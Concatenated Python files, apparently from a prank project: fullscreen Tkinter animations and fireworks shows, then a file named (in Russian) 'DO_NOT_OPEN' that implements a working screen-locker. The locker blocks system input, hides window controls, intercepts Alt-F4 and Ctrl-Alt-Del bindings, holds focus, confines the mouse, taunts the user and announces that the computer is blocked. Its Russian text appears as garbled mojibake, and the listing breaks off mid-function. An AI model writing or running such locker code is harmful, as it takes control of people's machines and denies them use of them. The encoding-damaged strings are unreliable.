            color = random.choice(['red', 'blue', 'green', 'yellow', 'cyan', 'magenta'])
            star = self.canvas.create_polygon(self.create_star_points(x, y, size), fill=color, outline='')
            stars.append({'item': star, 'center_x': x, 'center_y': y, 'angle': 0, 'size': size})
       
        self.rotate_shapes(stars)

    def create_star_points(self, x, y, size):
        points = []
        for i in range(5):
            angle = math.pi/2 + i * 2*math.pi/5
            points.extend([x + size * math.cos(angle), y - size * math.sin(angle)])
            angle += math.pi/5
            points.extend([x + size/2 * math.cos(angle), y - size/2 * math.sin(angle)])
        return points

    def rotate_shapes(self, stars):
        for star in stars:
            self.canvas.delete(star['item'])
            star['angle'] += 0.1
            new_points = []
            for i in range(0, len(self.create_star_points(0, 0, star['size'])), 2):
                px = self.create_star_points(0, 0, star['size'])[i]
                py = self.create_star_points(0, 0, star['size'])[i+1]
                rx = px * math.cos(star['angle']) - py * math.sin(star['angle'])
                ry = px * math.sin(star['angle']) + py * math.cos(star['angle'])
                new_points.extend([star['center_x'] + rx, star['center_y'] + ry])
           
            star['item'] = self.canvas.create_polygon(new_points, fill=random.choice(['red', 'blue', 'green', 'yellow']), outline='')
       
        self.root.after(50, lambda: self.rotate_shapes(stars))

    def create_pulsating_circles(self):
        circles = []
        for _ in range(5):
            x = random.randint(100, self.root.winfo_screenwidth()-100)
            y = random.randint(100, self.root.winfo_screenheight()-100)
            size = random.randint(10, 30)
            color = random.choice(['red', 'blue', 'green', 'yellow', 'cyan', 'magenta'])
            circle = self.canvas.create_oval(x-size, y-size, x+size, y+size, fill=color, outline='')
            circles.append({'item': circle, 'x': x, 'y': y, 'size': size, 'growing': True})
       
        self.pulsate_circles(circles)

    def pulsate_circles(self, circles):
        for circle in circles:
            if circle['growing']:
                circle['size'] += 1
                if circle['size'] > 50:
                    circle['growing'] = False
            else:
                circle['size'] -= 1
                if circle['size'] < 10:
                    circle['growing'] = True
           
            self.canvas.delete(circle['item'])
            circle['item'] = self.canvas.create_oval(
                circle['x']-circle['size'], circle['y']-circle['size'],
                circle['x']+circle['size'], circle['y']+circle['size'],
                fill=random.choice(['red', 'blue', 'green', 'yellow']), outline=''
            )
       
        self.root.after(100, lambda: self.pulsate_circles(circles))

    def create_mouse_trail(self):
        """–°–æ–∑–¥–∞–µ–º —Å–ª–µ–¥ –æ—Ç –º—ã—à–∏"""
        self.mouse_trail = []
        self.canvas.bind("<Motion>", self.add_mouse_trail_point)
        self.animate_mouse_trail()

    def add_mouse_trail_point(self, event):
        """–î–æ–±–∞–≤–ª—è–µ–º —Ç–æ—á–∫—É –≤ —Å–ª–µ–¥ –º—ã—à–∏"""
        if len(self.mouse_trail) > 20:  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É —Å–ª–µ–¥–∞
            self.mouse_trail.pop(0)
        self.mouse_trail.append((event.x, event.y))

    def animate_mouse_trail(self):
        """–ê–Ω–∏–º–∏—Ä—É–µ–º —Å–ª–µ–¥ –æ—Ç –º—ã—à–∏"""
        if hasattr(self, 'mouse_trail') and self.mouse_trail:
            for i in range(len(self.mouse_trail) - 1):
                x1, y1 = self.mouse_trail[i]
                x2, y2 = self.mouse_trail[i + 1]
                color = random.choice(['red', 'blue', 'green', 'yellow', 'cyan', 'magenta'])
                self.canvas.create_line(x1, y1, x2, y2, fill=color, width=2)
        
        self.root.after(50, self.animate_mouse_trail)

    def create_spinning_text(self):
        """–°–æ–∑–¥–∞–µ–º –≤—Ä–∞—â–∞—é—â–∏–π—Å—è —Ç–µ–∫—Å—Ç"""
        texts = ["üí´", "üåÄ", "‚ö°", "üåü", "‚ú®", "üå™Ô∏è"]
        for i in range(5):
            x = random.randint(100, self.root.winfo_screenwidth()-100)
            y = random.randint(100, self.root.winfo_screenheight()-100)
            text = random.choice(texts)
            color = random.choice(['red', 'blue', 'green', 'yellow', 'cyan', 'magenta'])
            item = self.canvas.create_text(x, y, text=text, font=("Arial", 48), fill=color)
            self.animate_spinning_text(item, 0)

    def animate_spinning_text(self, item, angle):
        """–ê–Ω–∏–º–∏—Ä—É–µ–º –≤—Ä–∞—â–µ–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞"""
        coords = self.canvas.coords(item)
        if coords:
            x, y = coords
            self.canvas.delete(item)
            new_item = self.canvas.create_text(x, y, text=self.canvas.itemcget(item, "text"), 
                                             font=("Arial", 48), fill=self.canvas.itemcget(item, "fill"),
                                             angle=angle)
            self.root.after(100, lambda: self.animate_spinning_text(new_item, (angle + 10) % 360))

    def create_screen_shake(self):
        """–°–æ–∑–¥–∞–µ–º —ç—Ñ—Ñ–µ–∫—Ç —Ç—Ä—è—Å–∫–∏ —ç–∫—Ä–∞–Ω–∞"""
        self.original_position = self.root.winfo_x(), self.root.winfo_y()
        self.shake_screen()

    def shake_screen(self):
        """–¢—Ä—è—Å–µ–º —ç–∫—Ä–∞–Ω"""
        if hasattr(self, 'original_position'):
            dx = random.randint(-10, 10)
            dy = random.randint(-10, 10)
            self.root.geometry(f"+{self.original_position[0] + dx}+{self.original_position[1] + dy}")
            self.root.after(100, self.reset_screen_position)

    def reset_screen_position(self):
        """–í–æ–∑–≤—Ä–∞—â–∞–µ–º —ç–∫—Ä–∞–Ω –≤ –∏—Å—Ö–æ–¥–Ω–æ–µ –ø–æ–ª–æ–∂–µ–Ω–∏–µ"""
        if hasattr(self, 'original_position'):
            self.root.geometry(f"+{self.original_position[0]}+{self.original_position[1]}")
            self.root.after(random.randint(500, 2000), self.shake_screen)

    def party_over(self):
        """–ó–∞–≤–µ—Ä—à–∞–µ–º –≤–µ—á–µ—Ä–∏–Ω–∫—É"""
        self.canvas.delete("all")
        self.root.configure(bg='black')
        self.canvas.configure(bg='black')
       
        # –ü—Ä–æ—â–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
        self.canvas.create_text(
            self.root.winfo_screenwidth()//2,
            self.root.winfo_screenheight()//2 - 50,
            text="üéâ –í–ï–ß–ï–†–ò–ù–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê! üéâ",
            font=("Arial", 36, "bold"),
            fill="white"
        )
       
        self.canvas.create_text(
            self.root.winfo_screenwidth()//2,
            self.root.winfo_screenheight()//2 + 50,
            text="–ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–ª–∞–≤–∏—à—É –¥–ª—è –≤—ã—Ö–æ–¥–∞",
            font=("Arial", 20),
            fill="yellow"
        )
       
        # –†–∞–∑—Ä–µ—à–∞–µ–º –≤—ã—Ö–æ–¥
        self.root.unbind("<Escape>")
        self.root.bind("<Key>", lambda e: self.root.destroy())

    def run(self):
        try:
            self.root.mainloop()
        except:
            try:
                self.root.destroy()
            except:
                pass

if __name__ == "__main__":
    party = ChaosParty()
    party.run()



fireworks.py:
import tkinter as tk
import random
import math
import time

class MegaFireworksShow:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.window = None
        self.canvas = None
        self.particles = []
        self.burst_count = 0
        self.max_bursts = 15  # More bursts for bigger show
        
    def show(self):
        """Start the mega fireworks show"""
        self.window = tk.Toplevel(self.root)
        self.window.title("üéÜ –ú–ï–ì–ê –§–ï–ô–ï–†–í–ï–†–ö –®–û–£! üéÜ")
        self.window.attributes('-fullscreen', True)
        self.window.configure(bg='black')
        self.window.overrideredirect(True)
        self.window.attributes('-topmost', True)
        
        # Bind keys to close
        self.window.bind('<Escape>', lambda e: self.close())
        self.window.bind('<Any-Key>', lambda e: self.close())
        self.window.bind('<Button-1>', lambda e: self.close())
        
        self.canvas = tk.Canvas(self.window, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        # Add title text
        self.canvas.create_text(
            self.window.winfo_screenwidth() // 2,
            50,
            text="üéÜ –ü–û–ë–ï–î–ê! –ú–ï–ì–ê –§–ï–ô–ï–†–í–ï–†–ö! üéÜ",
            fill="white",
            font=("Arial", 24, "bold")
        )
        
        # Start the show with multiple bursts
        self.start_show()
        
        self.window.focus_force()
        self.root.mainloop()
    
    def start_show(self):
        """Start the fireworks show with timed bursts"""
        if self.burst_count < self.max_bursts:
            self.create_mega_burst()
            self.burst_count += 1
            # Schedule next burst with random delay
            delay = random.randint(300, 800)
            self.window.after(delay, self.start_show)
        else:
            # Final grand finale
            self.window.after(1000, self.grand_finale)
    
    def create_mega_burst(self):
        """Create a massive firework burst"""
        screen_width = self.window.winfo_screenwidth()
        screen_height = self.window.winfo_screenheight()
        
        # More vibrant colors
        colors = [
            '#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#00FFFF',
            '#FF00FF', '#FFA500', '#800080', '#FFFFFF', '#FF69B4',
            '#00FF7F', '#FF4500', '#DA70D6', '#7FFF00', '#FFD700'
        ]
        
        # Create multiple burst centers
        centers = []
        for _ in range(random.randint(2, 4)):
            center_x = random.randint(100, screen_width - 100)
            center_y = random.randint(100, screen_height - 200)
            centers.append((center_x, center_y))
        
        # Create 150-200 particles per burst center
        for center_x, center_y in centers:
            for _ in range(random.randint(150, 200)):
                angle = random.uniform(0, 2 * math.pi)
                speed = random.uniform(3, 10)  # Faster particles
                size = random.randint(3, 8)    # Bigger particles
                color = random.choice(colors)
                
                particle = self.canvas.create_oval(
                    center_x - size, center_y - size,
                    center_x + size, center_y + size,
                    fill=color, outline=color
                )
                
                self.particles.append({
                    'id': particle,
                    'dx': speed * math.cos(angle),
                    'dy': speed * math.sin(angle),
                    'life': random.randint(60, 100),  # Longer life
                    'color': color,
                    'size': size
                })
        
        # Start animation
        self.update_animation()
    
    def grand_finale(self):
        """Grand finale - massive simultaneous bursts"""
        screen_width = self.window.winfo_screenwidth()
        screen_height = self.window.winfo_screenheight()
        
        colors = ['#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#00FFFF', '#FF00FF']
        
        # Create 5 massive bursts simultaneously
        for i in range(5):
            center_x = screen_width // 6 + (screen_width // 3) * (i % 3)
            center_y = screen_height // 4 + random.randint(-50, 50)
            
            for _ in range(250):  # Huge number of particles
                angle = random.uniform(0, 2 * math.pi)
                speed = random.uniform(4, 12)
                size = random.randint(4, 10)
                color = random.choice(colors)
                
                particle = self.canvas.create_oval(
                    center_x - size, center_y - size,
                    center_x + size, center_y + size,
                    fill=color, outline=color
                )
                
                self.particles.append({
                    'id': particle,
                    'dx': speed * math.cos(angle),
                    'dy': speed * math.sin(angle),
                    'life': random.randint(80, 120),
                    'color': color,
                    'size': size
                })
        
        self.update_animation()
    
    def update_animation(self):
        """Update all particles"""
        if not self.window or not self.canvas:
            return
            
        to_remove = []
        
        for p in self.particles:
            p['life'] -= 1
            if p['life'] <= 0:
                # Fade out effect
                current_alpha = p['life'] / 100.0
                if current_alpha > 0:
                    # Simulate fade by reducing size
                    new_size = max(1, int(p['size'] * current_alpha))
                    coords = self.canvas.coords(p['id'])
                    center_x = (coords[0] + coords[2]) / 2
                    center_y = (coords[1] + coords[3]) / 2
                    self.canvas.coords(p['id'], 
                        center_x - new_size, center_y - new_size,
                        center_x + new_size, center_y + new_size
                    )
                else:
                    self.canvas.delete(p['id'])
                    to_remove.append(p)
            else:
                self.canvas.move(p['id'], p['dx'], p['dy'])
                # Stronger gravity for more dramatic effect
                p['dy'] += 0.15
        
        # Remove dead particles
        for p in to_remove:
            if p in self.particles:
                self.particles.remove(p)
        
        # Continue animation
        if self.particles:
            self.window.after(25, self.update_animation)
        elif self.burst_count >= self.max_bursts:
            # Show closing message
            self.canvas.create_text(
                self.window.winfo_screenwidth() // 2,
                self.window.winfo_screenheight() // 2,
                text="üéâ –®–û–£ –ó–ê–í–ï–†–®–ï–ù–û! üéâ",
                fill="white",
                font=("Arial", 32, "bold")
            )
            self.window.after(3000, self.close)
    
    def close(self):
        """Close the show"""
        if self.window:
            self.window.destroy()
        if self.root:
            self.root.quit()
            self.root.destroy()

def show_mega_fireworks():
    """Start the mega fireworks show"""
    show = MegaFireworksShow()
    show.show()

if __name__ == "__main__":
    show_mega_fireworks()
import tkinter as tk
import random
import math
import time
import os
import threading
from playsound import playsound

class MegaFireworksSpectacle:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.window = None
        self.canvas = None
        self.particles = []
        self.current_round = 0
        self.max_rounds = 3
        self.burst_count = 0
        self.music_playing = False
        
    def start_spectacle(self):
        """Start the 3-round fireworks spectacle"""
        self.window = tk.Toplevel(self.root)
        self.window.title("üéÜ –ú–ï–ì–ê –§–ï–ô–ï–†–í–ï–†–ö –®–û–£ - 3 –†–ê–£–ù–î–ê! üéÜ")
        self.window.attributes('-fullscreen', True)
        self.window.configure(bg='black')
        self.window.overrideredirect(True)
        self.window.attributes('-topmost', True)
        
        # Bind keys to close
        self.window.bind('<Escape>', lambda e: self.close_show())
        self.window.bind('<Any-Key>', lambda e: self.close_show())
        
        self.canvas = tk.Canvas(self.window, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        # Start background music
        self.play_background_music()
        
        # Start the first round
        self.start_next_round()
        
        self.window.focus_force()
        self.root.mainloop()
    
    def play_background_music(self):
        """Play background music in separate thread"""
        def music_thread():
            try:
                if os.path.exists("fireworks.mp3"):
                    self.music_playing = True
                    playsound("fireworks.mp3")
                else:
                    print("–§–∞–π–ª fireworks.mp3 –Ω–µ –Ω–∞–π–¥–µ–Ω! –ú—É–∑—ã–∫–∞ –Ω–µ –±—É–¥–µ—Ç –∏–≥—Ä–∞—Ç—å.")
            except:
                print("–û—à–∏–±–∫–∞ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –º—É–∑—ã–∫–∏")
        
        thread = threading.Thread(target=music_thread)
        thread.daemon = True
        thread.start()
    
    def start_next_round(self):
        """Start the next round of fireworks"""
        self.current_round += 1
        self.burst_count = 0
        
        if self.current_round > self.max_rounds:
            self.grand_finale()
            return
            
        # Show round title
        round_titles = [
            "–†–ê–£–ù–î 1: –ö–õ–ê–°–°–ò–ß–ï–°–ö–ò–ï –í–ó–†–´–í–´",
            "–†–ê–£–ù–î 2: –°–ü–ò–†–ê–õ–¨–ù–´–ï –£–ó–û–†–´", 
            "–†–ê–£–ù–î 3: –¶–í–ï–¢–û–ß–ù–´–ï –ë–£–†–ò"
        ]
        
        self.canvas.delete("all")
        self.canvas.create_text(
            self.window.winfo_screenwidth() // 2,
            self.window.winfo_screenheight() // 2,
            text=round_titles[self.current_round - 1],
            fill="white",
            font=("Arial", 28, "bold"),
            justify="center"
        )
        
        self.window.after(2000, self.start_round_show)
    
    def start_round_show(self):
        """Start the actual fireworks for current round"""
        if self.current_round == 1:
            self.round_classic_bursts()
        elif self.current_round == 2:
            self.round_spiral_patterns()
        elif self.current_round == 3:
            self.round_flower_storms()
    
    def round_classic_bursts(self):
        """Round 1: Massive classic colorful bursts"""
        if self.burst_count < 12:
            self.create_classic_burst()
            self.burst_count += 1
            delay = random.randint(400, 700)
            self.window.after(delay, self.round_classic_bursts)
        else:
            self.window.after(1500, self.start_next_round)
    
    def round_spiral_patterns(self):
        """Round 2: Beautiful spiral patterns"""
        if self.burst_count < 8:
            self.create_spiral_burst()
            self.burst_count += 1
            delay = random.randint(600, 900)
            self.window.after(delay, self.round_spiral_patterns)
        else:
            self.window.after(1500, self.start_next_round)
    
    def round_flower_storms(self):
        """Round 3: Flower-like storm patterns"""
        if self.burst_count < 10:
            self.create_flower_burst()
            self.burst_count += 1
            delay = random.randint(300, 600)
            self.window.after(delay, self.round_flower_storms)
        else:
            self.window.after(1500, self.start_next_round)
    
    def create_classic_burst(self):
        """Create massive classic firework burst"""
        screen_width = self.window.winfo_screenwidth()
        screen_height = self.window.winfo_screenheight()
        
        colors = ['#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#00FFFF',
                 '#FF00FF', '#FFA500', '#800080', '#FFFFFF', '#FF69B4']
        
        # Create 3-5 burst centers
        centers = []
        for _ in range(random.randint(3, 5)):
            center_x = random.randint(150, screen_width - 150)
            center_y = random.randint(150, screen_height - 250)
            centers.append((center_x, center_y))
        
        # Create 200-300 particles per center
        for center_x, center_y in centers:
            for _ in range(random.randint(200, 300)):
                angle = random.uniform(0, 2 * math.pi)
                speed = random.uniform(4, 12)
                size = random.randint(4, 9)
                color = random.choice(colors)
                
                particle = self.canvas.create_oval(
                    center_x - size, center_y - size,
                    center_x + size, center_y + size,
                    fill=color, outline=color
                )
                
                self.particles.append({
                    'id': particle,
                    'dx': speed * math.cos(angle),
                    'dy': speed * math.sin(angle),
                    'life': random.randint(70, 120),
                    'color': color,
                    'size': size
                })
        
        self.update_animation()
    
    def create_spiral_burst(self):
        """Create beautiful spiral pattern burst"""
        screen_width = self.window.winfo_screenwidth()
        screen_height = self.window.winfo_screenheight()
        
        center_x = random.randint(200, screen_width - 200)
        center_y = random.randint(200, screen_height - 300)
        
        colors = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#F9A826', '#6C5CE7']
        
        # Create spiral pattern
        spiral_arms = 6
        particles_per_arm = 50
        
        for arm in range(spiral_arms):
            base_angle = (arm * 2 * math.pi) / spiral_arms
            
            for i in range(particles_per_arm):
                distance = i * 3
                angle = base_angle + (i * 0.1)
                speed = 4 + (i * 0.1)
                size = max(2, 6 - (i * 0.08))
                color = colors[arm % len(colors)]
                
                particle = self.canvas.create_oval(
                    center_x - size, center_y - size,
                    center_x + size, center_y + size,
                    fill=color, outline=color
                )
                
                self.particles.append({
                    'id': particle,
                    'dx': speed * math.cos(angle),
                    'dy': speed * math.sin(angle),
                    'life': random.randint(80, 140),
                    'color': color,
                    'size': size
                })
        
        self.update_animation()
    
    def create_flower_burst(self):
        """Create flower-like storm pattern"""
        screen_width = self.window.winfo_screenwidth()
        screen_height = self.window.winfo_screenheight()
        
        center_x = random.randint(250, screen_width - 250)
        center_y = random.randint(250, screen_height - 350)
        
        colors = ['#E91E63', '#9C27B0', '#673AB7', '#3F51B5', '#2196F3', '#00BCD4']
        
        # Create flower pattern with petals
        petals = 8
        particles_per_petal = 40
        
        for petal in range(petals):
            petal_angle = (petal * 2 * math.pi) / petals
            
            for i in range(particles_per_petal):
                # Flower shape equation
                t = i / particles_per_petal
                distance = 100 * math.sin(4 * t)
                angle = petal_angle + math.sin(8 * t) * 0.2
                
                speed = 3 + (t * 4)
                size = max(2, 5 - (t * 3))
                color = colors[petal % len(colors)]
                
                particle = self.canvas.create_oval(
                    center_x - size, center_y - size,
                    center_x + size, center_y + size,
                    fill=color, outline=color
                )
                
                self.particles.append({
                    'id': particle,
                    'dx': speed * math.cos(angle),
                    'dy': speed * math.sin(angle),
                    'life': random.randint(90, 160),
                    'color': color,
                    'size': size
                })
        
        self.update_animation()
    
    def grand_finale(self):
        """Grand finale with all patterns combined"""
        self.canvas.delete("all")
        self.canvas.create_text(
            self.window.winfo_screenwidth() // 2,
            100,
            text="üéÜ –ì–†–ê–ù–î –§–ò–ù–ê–õ! üéÜ",
            fill="gold",
            font=("Arial", 36, "bold")
        )
        
        # Create massive combined burst
        self.create_classic_burst()
        self.window.after(500, self.create_spiral_burst)
        self.window.after(1000, self.create_flower_burst)
        self.window.after(2000, self.create_classic_burst)
        self.window.after(2500, self.create_spiral_burst)
        self.window.after(3000, self.create_flower_burst)
        
        # Show completion message
        self.window.after(8000, self.show_completion)
    
    def show_completion(self):
        """Show completion message"""
        self.canvas.create_text(
            self.window.winfo_screenwidth() // 2,
            self.window.winfo_screenheight() // 2,
            text="üéâ –®–û–£ –ó–ê–í–ï–†–®–ï–ù–û! \n3 –≠–ü–ò–ß–ù–´–• –†–ê–£–ù–î–ê! üéâ",
            fill="white",
            font=("Arial", 32, "bold"),
            justify="center"
        )
        self.window.after(4000, self.close_show)
    
    def update_animation(self):
        """Update particle animation"""
        if not self.window or not self.canvas:
            return
            
        to_remove = []
        
        for p in self.particles:
            p['life'] -= 1
            if p['life'] <= 0:
                self.canvas.delete(p['id'])
                to_remove.append(p)
            else:
                self.canvas.move(p['id'], p['dx'], p['dy'])
                p['dy'] += 0.12  # Gravity
        
        for p in to_remove:
            if p in self.particles:
                self.particles.remove(p)
        
        if self.particles:
            self.window.after(20, self.update_animation)
    
    def close_show(self):
        """Close the entire show"""
        self.music_playing = False
        if self.window:
            self.window.destroy()
        if self.root:
            self.root.quit()
            self.root.destroy()

def start_mega_fireworks():
    """Start the mega fireworks spectacle"""
    spectacle = MegaFireworksSpectacle()
    spectacle.start_spectacle()

if __name__ == "__main__":
    start_mega_fireworks()


–ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py:
import tkinter as tk
from tkinter import messagebox
import sys
import os
import ctypes
import threading
import time
import subprocess
import pyttsx3
import signal
engine = pyttsx3.init()
engine.setProperty("rate", 150)
engine.setProperty("volume", 0.9)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
print("–ø–æ–¥–æ–∂–¥–∏—Ç–µ...")


kernel32.SetConsoleCtrlHandler(None, True)
def setup_signal_handlers():
            signal.signal(signal.SIGINT, signal_handler)
            signal.signal(signal.SIGTERM, signal_handler)

            signal.signal(signal.SIGABRT, signal_handler)
            if hasattr(signal, "SIGBREAK"):
                signal.signal(signal.SIGBREAK, signal_handler)
            
def signal_handler(signum, frame):
                messagebox.showwarning("–ê–•–ê–•–•–ê–•–ê–•", "—Ç—ã –¥—É–º–∞–ª —Ç–µ–±–µ –ø–æ–º–æ–∂–µ—Ç –∂–∞–ª–∫–∏–π —Å–∏–≥–Ω–∞–ª {signum}, –≥–ª—É–ø–µ–Ω—å–∫–∏–π?")
            
# –ë–ª–æ–∫–∏—Ä—É–µ–º –≤–≤–æ–¥ –Ω–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–º —É—Ä–æ–≤–Ω–µ
try:
    ctypes.windll.user32.BlockInput(True)
except:
    pass

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å win32api –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –º—ã—à–∏
try:
    import win32api
    import win32con
    WIN32_AVAILABLE = True
except:
    WIN32_AVAILABLE = False
engine.say("Your Computer Was blocked!")
engine.runAndWait()

class UnclosableApp:
    def __init__(self):
        self.running = True
        self.root = tk.Tk()
        self.root.title("–í–∞—à –∫–æ–º–ø—å—é—Ç–µ—Ä –±—ã–ª –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω")
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')
        self.root.overrideredirect(True)
        setup_signal_handlers()


       
    



        

        
        # –î–µ–ª–∞–µ–º –æ–∫–Ω–æ –ø–æ–≤–µ—Ä—Ö –≤—Å–µ—Ö –æ–∫–æ–Ω
        self.root.attributes('-topmost', True)
        
        # –ë–ª–æ–∫–∏—Ä—É–µ–º –≤—Å–µ —Å–ø–æ—Å–æ–±—ã –∑–∞–∫—Ä—ã—Ç–∏—è
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)
        self.root.bind("<Alt-F4>", self.prevent_close)
        self.root.bind("<Control-Alt-Delete>", self.intercept_ctrl_alt_del)
        self.root.bind("<Control-Shift-Escape>", self.intercept_ctrl_shift_esc)
        self.root.bind("<Escape>", self.prevent_close)
        self.root.bind("<Key>", self.handle_key_press)
        
        # –ë–ª–æ–∫–∏—Ä—É–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∫–ª–∞–≤–∏—à–∏
        system_keys = ['<Control_L>', '<Control_R>', '<Alt_L>', '<Alt_R>', 
                      '<Win_L>', '<Win_R>', '<Shift_L>', '<Shift_R>']
        for key in system_keys:
            self.root.bind(key, self.intercept_system_keys)
        
        # –ë–∏–Ω–¥–∏–º –∫–æ–º–±–∏–Ω–∞—Ü–∏—é –¥–ª—è —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –≤–≤–æ–¥–∞
        self.root.bind('<Control-Shift-Alt-q>', self.activate_secret_input)
        self.root.bind('<Control-Shift-Alt-Q>', self.activate_secret_input)
        
        # –°–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–¥
        self.secret_code = "h3x9wjaqQkd;w3*@9e2q"
        self.entered_code = ""
        
        # –û—Å–Ω–æ–≤–Ω–æ–π —Ç–µ–∫—Å—Ç
        self.label = tk.Label(
            self.root, 
            text="–ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–û!", 
            font=("Arial", 72, "bold"), 
            fg="red", 
            bg="black"
        )
        self.label.pack(expand=True)
        
        # –°–æ–æ–±—â–µ–Ω–∏–µ –æ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–µ (–∫—Ä–∞—Å–Ω—ã–π —Ç–µ–∫—Å—Ç –º–µ–∂–¥—É –∑–∞–≥–æ–ª–æ–≤–∫–æ–º –∏ –ø–æ–ª–µ–º –≤–≤–æ–¥–∞)
        self.unlock_label = tk.Label(
            self.root,
            text=" –Ω–∞–∂–º–∏—Ç–µ ctrl+shift+alt+q –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏. –î–ª—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –Ω–∞–∂–º–∏—Ç–µ FAQ.",
            font=("Arial", 12),
            fg="red",
            bg="black"
        )
        self.unlock_label.pack(pady=10)
        
        # –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –≤–≤–æ–¥–∞
        self.secret_input_active = False
        self.secret_input = ""
        self.real_secret_code = "38352*(#&002jsiQE27"
        
    
        
        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Ç–µ–∫—Å—Ç —Å–Ω–∏–∑—É (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å)
        self.bottom_label = tk.Label(
            self.root,
            text="–í–≤–µ–¥–∏—Ç–µ —Å–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–¥ –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤–∞—à–µ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.",
            font=("Arial", 16),
            fg="red",
            bg="black"
        )
        self.bottom_label.pack(side='bottom', pady=50)
        
        # –ö–Ω–æ–ø–∫–∞ –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è FAQ
        self.faq_button = tk.Button(
            self.root,
            text="FAQ",
            font=("Arial", 16),
            command=self.open_faq
        )
        self.faq_button.pack(side='bottom', pady=10)
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –∑–∞—â–∏—Ç–Ω—ã–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã
        self.start_protection_threads() #
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫—É –º—ã—à–∏
        threading.Thread(target=self.block_mouse_movement, daemon=True).start()
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä
        threading.Thread(target=self.timer_thread, daemon=True).start()
        
    def start_protection_threads(self):
        # –ü–æ—Ç–æ–∫ –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è —Ñ–æ–∫—É—Å–∞
        threading.Thread(target=self.keep_focus, daemon=True).start()
        
    
        
        
    def keep_focus(self):
        while True:
            try:
                self.root.focus_force()
                time.sleep(0.1)
            except:
                pass
        
   

    
        
    
    def block_mouse_movement(self):
        """–ë–ª–æ–∫–∏—Ä—É–µ–º –¥–≤–∏–∂–µ–Ω–∏–µ –º—ã—à–∏ - –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –≤ –º–∞–ª–µ–Ω—å–∫–æ–π –æ–±–ª–∞—Å—Ç–∏"""
        while True:
            try:
                if WIN32_AVAILABLE:
                    # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â—É—é –ø–æ–∑–∏—Ü–∏—é –º—ã—à–∏
                    x, y = win32api.GetCursorPos()
                    
                    # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–≤–∏–∂–µ–Ω–∏–µ –≤ –Ω–µ–±–æ–ª—å—à–æ–π –æ–±–ª–∞—Å—Ç–∏ (50x50 –ø–∏–∫—Å–µ–ª–µ–π)
                    max_x = min(x + 25, win32api.GetSystemMetrics(0))
                    min_x = max(x - 25, 0)
                    max_y = min(y + 25, win32api.GetSystemMetrics(1)) 
                    min_y = max(y - 25, 0)
                    
                    # –ï—Å–ª–∏ –º—ã—à—å –≤—ã—à–ª–∞ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã - –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –æ–±—Ä–∞—Ç–Ω–æ
                    if x < min_x or x > max_x or y < min_y or y > max_y:
                        center_x = (min_x + max_x) // 2
                        center_y = (min_y + max_y) // 2
                        win32api.SetCursorPos((center_x, center_y))
                    
                    time.sleep(0.1)
                else:
                    # –ü—Ä–æ—Å—Ç–æ–π –º–µ—Ç–æ–¥ - –¥–≤–∏–≥–∞–µ–º –∫ —Ü–µ–Ω—Ç—Ä—É —ç–∫—Ä–∞–Ω–∞
                    screen_width = self.root.winfo_screenwidth()
                    screen_height = self.root.winfo_screenheight()
                    center_x = screen_width // 2
                    center_y = screen_height // 2
                    
                    # –ò—Å–ø–æ–ª—å–∑—É–µ–º tkinter –¥–ª—è –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –º—ã—à–∏
                    self.root.event_generate('<Motion>', warp=True, x=center_x, y=center_y)
                    time.sleep(2)
            except:
